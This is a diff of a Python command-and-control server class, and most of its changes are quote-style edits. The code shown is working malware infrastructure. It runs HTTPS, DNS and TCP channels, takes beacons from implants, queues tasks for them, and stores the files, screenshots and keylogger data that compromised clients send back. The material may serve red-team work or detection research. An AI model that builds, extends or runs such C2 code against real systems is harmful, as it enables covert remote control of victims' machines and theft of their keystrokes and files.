@@ -30,9 +30,7 @@ Main C2 server implementation with multi-protocol support,
 encryption, and session management.
 """
 
-from flask import Flask
 from .base_c2 import BaseC2
-from ...utils.logger import get_logger
 from ...utils.constants import C2_DEFAULTS
 
 logger = logging.getLogger(__name__)
@@ -46,8 +44,8 @@ class C2Server(BaseC2):
 
     def __init__(self, host: str = None, port: int = None):
         """Initialize the C2 server with host and port configuration."""
-        self.host = host or C2_DEFAULTS['http']['host']
-        self.port = port or C2_DEFAULTS['http']['port']
+        self.host = host or C2_DEFAULTS["http"]["host"]
+        self.port = port or C2_DEFAULTS["http"]["port"]
         self.running = False
         self.server = None
         self.logger = logging.getLogger(__name__)
@@ -55,10 +53,10 @@ class C2Server(BaseC2):
         self.sessions: Dict[str, Any] = {}
         self.commands_queue = queue.Queue()
         self.event_handlers: Dict[str, List[Callable]] = {
-            'client_connected': [],
-            'client_disconnected': [],
-            'command_received': [],
-            'message_received': []
+            "client_connected": [],
+            "client_disconnected": [],
+            "command_received": [],
+            "message_received": []
         }
 
 
@@ -67,53 +65,53 @@ class C2Server(BaseC2):
         protocols_config = []
 
         # HTTPS Protocol
-        if self.config.get('https_enabled', True):
-            https_config = self.config.get('https', {})
+        if self.config.get("https_enabled", True):
+            https_config = self.config.get("https", {})
             # Use environment variables with fallback to config values
-            https_host = os.environ.get('C2_HTTPS_HOST', https_config.get('host', C2_DEFAULTS['https']['host']))
-            https_port = int(os.environ.get('C2_HTTPS_PORT', https_config.get('port', C2_DEFAULTS['https']['port'])))
+            https_host = os.environ.get("C2_HTTPS_HOST", https_config.get("host", C2_DEFAULTS["https"]["host"]))
+            https_port = int(os.environ.get("C2_HTTPS_PORT", https_config.get("port", C2_DEFAULTS["https"]["port"])))
 
             protocols_config.append({
-                'type': 'https',
-                'server_url': f"https://{https_host}:{https_port}",
-                'headers': https_config.get('headers', {}),
-                'priority': 1
+                "type": "https",
+                "server_url": f"https://{https_host}:{https_port}",
+                "headers": https_config.get("headers", {}),
+                "priority": 1
             })
 
         # DNS Protocol
-        if self.config.get('dns_enabled', False):
-            dns_config = self.config.get('dns', {})
+        if self.config.get("dns_enabled", False):
+            dns_config = self.config.get("dns", {})
             # Use environment variables with fallback to config values
-            dns_domain = os.environ.get('C2_DNS_DOMAIN', dns_config.get('domain', C2_DEFAULTS['dns']['domain']))
-            dns_host = os.environ.get('C2_DNS_HOST', dns_config.get('host', C2_DEFAULTS['dns']['host']))
-            dns_port = int(os.environ.get('C2_DNS_PORT', dns_config.get('port', C2_DEFAULTS['dns']['port'])))
+            dns_domain = os.environ.get("C2_DNS_DOMAIN", dns_config.get("domain", C2_DEFAULTS["dns"]["domain"]))
+            dns_host = os.environ.get("C2_DNS_HOST", dns_config.get("host", C2_DEFAULTS["dns"]["host"]))
+            dns_port = int(os.environ.get("C2_DNS_PORT", dns_config.get("port", C2_DEFAULTS["dns"]["port"])))
 
             protocols_config.append({
-                'type': 'dns',
-                'domain': dns_domain,
-                'dns_server': f"{dns_host}:{dns_port}",
-                'priority': 2
+                "type": "dns",
+                "domain": dns_domain,
+                "dns_server": f"{dns_host}:{dns_port}",
+                "priority": 2
             })
 
         # TCP Protocol
-        if self.config.get('tcp_enabled', False):
-            tcp_config = self.config.get('tcp', {})
+        if self.config.get("tcp_enabled", False):
+            tcp_config = self.config.get("tcp", {})
             # Use environment variables with fallback to config values
-            tcp_host = os.environ.get('C2_TCP_HOST', tcp_config.get('host', C2_DEFAULTS['tcp']['host']))
-            tcp_port = int(os.environ.get('C2_TCP_PORT', tcp_config.get('port', C2_DEFAULTS['tcp']['port'])))
+            tcp_host = os.environ.get("C2_TCP_HOST", tcp_config.get("host", C2_DEFAULTS["tcp"]["host"]))
+            tcp_port = int(os.environ.get("C2_TCP_PORT", tcp_config.get("port", C2_DEFAULTS["tcp"]["port"])))
 
             protocols_config.append({
-                'type': 'tcp',
-                'host': tcp_host,
-                'port': tcp_port,
-                'priority': 3
+                "type": "tcp",
+                "host": tcp_host,
+                "port": tcp_port,
+                "priority": 3
             })
 
         # Use base class method
         self.initialize_protocols(protocols_config, self.encryption_manager)
 
         # Convert to dict for server usage
-        self.protocols = {p['type']: p['handler'] for p in self.protocols}
+        self.protocols = {p["type"]: p["handler"] for p in self.protocols}
 
     def _initialize_auth_tokens(self):
         """Initialize authentication tokens from configuration or generate new ones."""
@@ -122,19 +120,19 @@ class C2Server(BaseC2):
         from ..utils.secrets_manager import get_secret, store_secret
 
         # Try to get existing auth tokens
-        auth_tokens_str = get_secret('C2_AUTH_TOKENS', None)
+        auth_tokens_str = get_secret("C2_AUTH_TOKENS", None)
 
         if auth_tokens_str:
             # Parse existing tokens
             try:
-                self.auth_tokens = set(auth_tokens_str.split(','))
+                self.auth_tokens = set(auth_tokens_str.split(","))
                 self.logger.info(f"Loaded {len(self.auth_tokens)} authentication tokens")
             except Exception as e:
                 self.logger.error(f"Failed to parse auth tokens: {e}")
                 self.auth_tokens = set()
         else:
             # Generate new auth tokens
-            num_tokens = self.config.get('auth_token_count', 5)
+            num_tokens = self.config.get("auth_token_count", 5)
             new_tokens = []
 
             for _i in range(num_tokens):
@@ -144,7 +142,7 @@ class C2Server(BaseC2):
 
             # Store tokens
             try:
-                store_secret('C2_AUTH_TOKENS', ','.join(new_tokens))
+                store_secret("C2_AUTH_TOKENS", ",".join(new_tokens))
                 self.logger.info(f"Generated and stored {num_tokens} new authentication tokens")
             except Exception as e:
                 self.logger.warning(f"Could not store auth tokens: {e}")
@@ -155,8 +153,8 @@ class C2Server(BaseC2):
             # Check if IP is locked out
             if remote_addr in self.failed_auth_attempts:
                 attempts_info = self.failed_auth_attempts[remote_addr]
-                if attempts_info['count'] >= self.max_auth_attempts:
-                    lockout_time = time.time() - attempts_info['last_attempt']
+                if attempts_info["count"] >= self.max_auth_attempts:
+                    lockout_time = time.time() - attempts_info["last_attempt"]
                     if lockout_time < self.auth_lockout_duration:
                         self.logger.warning(f"Authentication blocked for {remote_addr} - lockout active")
                         return False
@@ -174,14 +172,14 @@ class C2Server(BaseC2):
                 # Track failed attempt
                 if remote_addr not in self.failed_auth_attempts:
                     self.failed_auth_attempts[remote_addr] = {
-                        'count': 0,
-                        'last_attempt': 0
+                        "count": 0,
+                        "last_attempt": 0
                     }
 
-                self.failed_auth_attempts[remote_addr]['count'] += 1
-                self.failed_auth_attempts[remote_addr]['last_attempt'] = time.time()
+                self.failed_auth_attempts[remote_addr]["count"] += 1
+                self.failed_auth_attempts[remote_addr]["last_attempt"] = time.time()
 
-                remaining_attempts = self.max_auth_attempts - self.failed_auth_attempts[remote_addr]['count']
+                remaining_attempts = self.max_auth_attempts - self.failed_auth_attempts[remote_addr]["count"]
                 if remaining_attempts > 0:
                     self.logger.warning(f"Failed auth from {remote_addr} - {remaining_attempts} attempts remaining")
                 else:
@@ -275,13 +273,13 @@ class C2Server(BaseC2):
             self.logger.info(f"New connection attempt from {connection_info.get('remote_addr')}")
 
             # Check for authentication token
-            auth_token = connection_info.get('auth_token')
+            auth_token = connection_info.get("auth_token")
             if not auth_token:
                 self.logger.warning(f"Connection rejected - no authentication token from {connection_info.get('remote_addr')}")
                 return None
 
             # Verify authentication token
-            if not await self._verify_auth_token(auth_token, connection_info.get('remote_addr')):
+            if not await self._verify_auth_token(auth_token, connection_info.get("remote_addr")):
                 self.logger.warning(f"Connection rejected - invalid authentication token from {connection_info.get('remote_addr')}")
                 return None
 
@@ -289,11 +287,11 @@ class C2Server(BaseC2):
             session = await self.session_manager.create_session(connection_info)
 
             # Update statistics
-            self.stats['total_connections'] += 1
-            self.stats['active_sessions'] = len(self.session_manager.get_active_sessions())
+            self.stats["total_connections"] += 1
+            self.stats["active_sessions"] = len(self.session_manager.get_active_sessions())
 
             # Trigger event handlers
-            await self._trigger_event('session_connected', session)
+            await self._trigger_event("session_connected", session)
 
             self.logger.info(f"Authenticated connection established with {connection_info.get('remote_addr')}")
             return session
@@ -314,17 +312,17 @@ class C2Server(BaseC2):
             session.update_last_seen()
 
             # Process message based on type
-            message_type = message.get('type', 'unknown')
+            message_type = message.get("type", "unknown")
 
-            if message_type == 'beacon':
+            if message_type == "beacon":
                 await self._handle_beacon(session, message)
-            elif message_type == 'task_result':
+            elif message_type == "task_result":
                 await self._handle_task_result(session, message)
-            elif message_type == 'file_upload':
+            elif message_type == "file_upload":
                 await self._handle_file_upload(session, message)
-            elif message_type == 'screenshot':
+            elif message_type == "screenshot":
                 await self._handle_screenshot(session, message)
-            elif message_type == 'keylog_data':
+            elif message_type == "keylog_data":
                 await self._handle_keylog_data(session, message)
             else:
                 self.logger.warning(f"Unknown message type: {message_type}")
@@ -343,10 +341,10 @@ class C2Server(BaseC2):
                 await self.session_manager.mark_session_inactive(session_id)
 
                 # Update statistics
-                self.stats['active_sessions'] = len(self.session_manager.get_active_sessions())
+                self.stats["active_sessions"] = len(self.session_manager.get_active_sessions())
 
                 # Trigger event handlers
-                await self._trigger_event('session_disconnected', session)
+                await self._trigger_event("session_disconnected", session)
 
         except Exception as e:
             self.logger.error(f"Error handling disconnection: {e}")
@@ -354,16 +352,16 @@ class C2Server(BaseC2):
     async def _handle_protocol_error(self, protocol_name: str, error: Exception):
         """Handle protocol-specific errors."""
         self.logger.error(f"Protocol {protocol_name} error: {error}")
-        await self._trigger_event('error_occurred', {
-            'type': 'protocol_error',
-            'protocol': protocol_name,
-            'error': str(error)
+        await self._trigger_event("error_occurred", {
+            "type": "protocol_error",
+            "protocol": protocol_name,
+            "error": str(error)
         })
 
     async def _handle_beacon(self, session, message: Dict[str, Any]):
         """Handle beacon message from client."""
         try:
-            beacon_data = message.get('data', {})
+            beacon_data = message.get("data", {})
 
             # Update beacon information
             self.beacon_manager.update_beacon(session.session_id, beacon_data)
@@ -374,19 +372,19 @@ class C2Server(BaseC2):
             if pending_tasks:
                 # Send tasks to client
                 response = {
-                    'type': 'tasks',
-                    'tasks': pending_tasks
+                    "type": "tasks",
+                    "tasks": pending_tasks
                 }
                 await session.send_message(response)
 
                 # Mark tasks as sent
                 for task in pending_tasks:
-                    await self.session_manager.mark_task_sent(task['task_id'])
+                    await self.session_manager.mark_task_sent(task["task_id"])
 
             # Trigger event
-            await self._trigger_event('beacon_received', {
-                'session': session,
-                'beacon_data': beacon_data
+            await self._trigger_event("beacon_received", {
+                "session": session,
+                "beacon_data": beacon_data
             })
 
         except Exception as e:
@@ -395,22 +393,22 @@ class C2Server(BaseC2):
     async def _handle_task_result(self, session, message: Dict[str, Any]):
         """Handle task execution result from client."""
         try:
-            task_id = message.get('task_id')
-            result = message.get('result')
-            success = message.get('success', False)
+            task_id = message.get("task_id")
+            result = message.get("result")
+            success = message.get("success", False)
 
             # Store task result
             await self.session_manager.store_task_result(task_id, result, success)
 
             # Update statistics
-            self.stats['commands_executed'] += 1
+            self.stats["commands_executed"] += 1
 
             # Trigger event
-            await self._trigger_event('command_executed', {
-                'session': session,
-                'task_id': task_id,
-                'result': result,
-                'success': success
+            await self._trigger_event("command_executed", {
+                "session": session,
+                "task_id": task_id,
+                "result": result,
+                "success": success
             })
 
         except Exception as e:
@@ -419,8 +417,8 @@ class C2Server(BaseC2):
     async def _handle_file_upload(self, session, message: Dict[str, Any]):
         """Handle file upload from client."""
         try:
-            filename = message.get('filename')
-            file_data = message.get('data')
+            filename = message.get("filename")
+            file_data = message.get("data")
             file_size = len(file_data) if file_data else 0
 
             # Store uploaded file
@@ -429,7 +427,7 @@ class C2Server(BaseC2):
             )
 
             # Update statistics
-            self.stats['data_transferred'] += file_size
+            self.stats["data_transferred"] += file_size
 
             self.logger.info(f"Received file upload: {filename} ({file_size} bytes)")
 
@@ -439,8 +437,8 @@ class C2Server(BaseC2):
     async def _handle_screenshot(self, session, message: Dict[str, Any]):
         """Handle screenshot from client."""
         try:
-            screenshot_data = message.get('data')
-            timestamp = message.get('timestamp', time.time())
+            screenshot_data = message.get("data")
+            timestamp = message.get("timestamp", time.time())
 
             # Store screenshot
             await self.session_manager.store_screenshot(
@@ -455,8 +453,8 @@ class C2Server(BaseC2):
     async def _handle_keylog_data(self, session, message: Dict[str, Any]):
         """Handle keylog data from client."""
         try:
-            keylog_data = message.get('data')
-            timestamp = message.get('timestamp', time.time())
+            keylog_data = message.get("data")
+            timestamp = message.get("timestamp", time.time())
 
             # Store keylog data
             await self.session_manager.store_keylog_data(
@@ -509,9 +507,9 @@ class C2Server(BaseC2):
     async def _process_command(self, command: Dict[str, Any]):
         """Process a command from the queue."""
         try:
-            session_id = command.get('session_id')
-            command_type = command.get('type')
-            command_data = command.get('data', {})
+            session_id = command.get("session_id")
+            command_type = command.get("type")
+            command_data = command.get("data", {})
 
             session = self.session_manager.get_session(session_id)
             if not session:
@@ -532,8 +530,8 @@ class C2Server(BaseC2):
         """Update server statistics periodically."""
         while self.running:
             try:
-                if self.stats['start_time']:
-                    self.stats['uptime_seconds'] = time.time() - self.stats['start_time']
+                if self.stats["start_time"]:
+                    self.stats["uptime_seconds"] = time.time() - self.stats["start_time"]
 
                 await asyncio.sleep(60)  # Update every minute
 
@@ -562,9 +560,9 @@ class C2Server(BaseC2):
     async def send_command(self, session_id: str, command_type: str, command_data: Dict[str, Any] = None):
         """Send a command to a specific session."""
         command = {
-            'session_id': session_id,
-            'type': command_type,
-            'data': command_data or {}
+            "session_id": session_id,
+            "type": command_type,
+            "data": command_data or {}
         }
         await self.command_queue.put(command)
 
@@ -578,12 +576,12 @@ class C2Server(BaseC2):
                 return False
 
             # Extract command details
-            command_type = command.get('type', 'unknown')
+            command_type = command.get("type", "unknown")
             command_data = command.copy()
 
             # Remove type from data to avoid duplication
-            if 'type' in command_data:
-                del command_data['type']
+            if "type" in command_data:
+                del command_data["type"]
 
             # Create task using asyncio in a thread-safe way
             loop = None
@@ -638,8 +636,8 @@ class C2Server(BaseC2):
     def get_server_statistics(self) -> Dict[str, Any]:
         """Get server statistics."""
         stats = self.stats.copy()
-        stats['beacon_stats'] = self.beacon_manager.get_statistics()
-        stats['session_stats'] = self.session_manager.get_statistics()
+        stats["beacon_stats"] = self.beacon_manager.get_statistics()
+        stats["session_stats"] = self.session_manager.get_statistics()
         return stats
 
     def get_protocols_status(self) -> Dict[str, Any]:
@@ -647,9 +645,9 @@ class C2Server(BaseC2):
         status = {}
         for protocol_name, protocol in self.protocols.items():
             status[protocol_name] = {
-                'enabled': True,
-                'status': 'running' if self.running else 'stopped',
-                'connections': getattr(protocol, 'connection_count', 0)
+                "enabled": True,
+                "status": "running" if self.running else "stopped",
+                "connections": getattr(protocol, "connection_count", 0)
             }
         return status
 
@@ -666,7 +664,7 @@ class C2Server(BaseC2):
 
         # Update stored tokens
         try:
-            store_secret('C2_AUTH_TOKENS', ','.join(self.auth_tokens))
+            store_secret("C2_AUTH_TOKENS", ",".join(self.auth_tokens))
             self.logger.info("Added new authentication token")
         except Exception as e:
             self.logger.warning(f"Could not update stored auth tokens: {e}")
@@ -682,7 +680,7 @@ class C2Server(BaseC2):
 
             # Update stored tokens
             try:
-                store_secret('C2_AUTH_TOKENS', ','.join(self.auth_tokens))
+                store_secret("C2_AUTH_TOKENS", ",".join(self.auth_tokens))
                 self.logger.info("Removed authentication token")
                 return True
             except Exception as e:
@@ -695,10 +693,10 @@ class C2Server(BaseC2):
     def get_auth_status(self) -> Dict[str, Any]:
         """Get authentication system status."""
         return {
-            'auth_enabled': True,
-            'token_count': len(self.auth_tokens),
-            'locked_out_ips': len([ip for ip, info in self.failed_auth_attempts.items()
-                                   if info['count'] >= self.max_auth_attempts]),
-            'max_attempts': self.max_auth_attempts,
-            'lockout_duration': self.auth_lockout_duration
+            "auth_enabled": True,
+            "token_count": len(self.auth_tokens),
+            "locked_out_ips": len([ip for ip, info in self.failed_auth_attempts.items()
+                                   if info["count"] >= self.max_auth_attempts]),
+            "max_attempts": self.max_auth_attempts,
+            "lockout_duration": self.auth_lockout_duration
         }
